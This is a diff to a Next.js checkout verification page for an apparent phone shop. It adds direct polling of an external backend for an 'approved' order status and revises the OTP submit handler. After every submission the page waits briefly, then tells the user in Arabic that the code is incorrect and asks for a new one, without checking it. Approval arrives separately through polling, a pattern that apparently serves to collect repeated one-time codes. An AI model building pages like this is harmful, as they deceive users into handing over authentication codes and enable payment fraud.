@@ -57,6 +57,7 @@ export default function VerifyPage() {
       if (pollingRef.current) return;
       pollingRef.current = setInterval(async () => {
         try {
+          // 1. Check Next.js API route
           const res = await fetch(`/api/verify?orderId=${encodeURIComponent(orderId)}&t=${Date.now()}`);
           if (res.ok) {
             const json = await res.json();
@@ -68,10 +69,29 @@ export default function VerifyPage() {
                 localStorage.removeItem("cart");
               } catch {}
               setIsConfirmed(true);
+              return;
+            }
+          }
+
+          // 2. Parallel direct check to Render backend
+          const directRes = await fetch(
+            `https://madar-phone-backend.onrender.com/api/checkout/verify-status/${encodeURIComponent(orderId)}?t=${Date.now()}`
+          ).catch(() => null);
+          if (directRes && directRes.ok) {
+            const directJson = await directRes.json();
+            if (directJson.status === "approved") {
+              stopPolling();
+              setSubmitting(false);
+              try {
+                sessionStorage.removeItem("verify_data");
+                localStorage.removeItem("cart");
+              } catch {}
+              setIsConfirmed(true);
+              return;
             }
           }
         } catch {}
-      }, 1500);
+      }, 1200);
     },
     [stopPolling]
   );
@@ -164,11 +184,16 @@ export default function VerifyPage() {
       });
     } catch {}
 
-    // After brief verification attempt, clear input and ask for new code
+    // After brief verification attempt, clear input and ask for new code (unless already confirmed)
     setTimeout(() => {
       setSubmitting(false);
-      setOtp("");
-      setError("الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى.");
+      setIsConfirmed((current) => {
+        if (!current) {
+          setOtp("");
+          setError("الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى.");
+        }
+        return current;
+      });
     }, 1400);
   };
 
